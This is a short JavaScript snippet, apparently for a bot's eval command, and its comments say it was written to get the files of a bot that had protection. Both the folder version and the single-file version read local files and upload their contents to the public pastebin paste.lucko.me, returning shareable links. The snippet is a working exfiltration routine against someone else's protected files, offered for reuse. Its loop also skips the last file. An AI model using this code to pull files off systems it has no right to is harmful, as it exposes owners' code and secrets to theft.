/*
** Parser the content of the file with subsequent upload to paste.lucko.me
**
** We needed to get the files of a bot that had protection.
** Fun fact: The code is written on the knee.
*/


let links = []; 
let folder = './HERE_YOUR_WAY'; 
const fetch = require("node-fetch"); 
const fs = require('fs'); 
const cmds = fs.readdirSync(folder); 
for(let i = 0; i < cmds.length - 1; i++){ 
let req = (await (await fetch('https://paste.lucko.me/documents', { 
method: "POST", 
body: fs.readFileSync(folder + "/" + cmds[i], 'utf8') 
})).json()); 
links.push({name: cmds[i], url: 'https://paste.lucko.me/' + req.key }); 
} 
return links;

/*
** Single file version.
*/


const fetch = require("node-fetch"); 
const fs = require('fs'); 
let file = "./HERE_YOUR_WAY" 
const req = (await (await fetch('https://paste.lucko.me/documents', { 
method: "POST", 
body: fs.readFileSync(file, 'utf8') 
})).json()); 
return req.key;
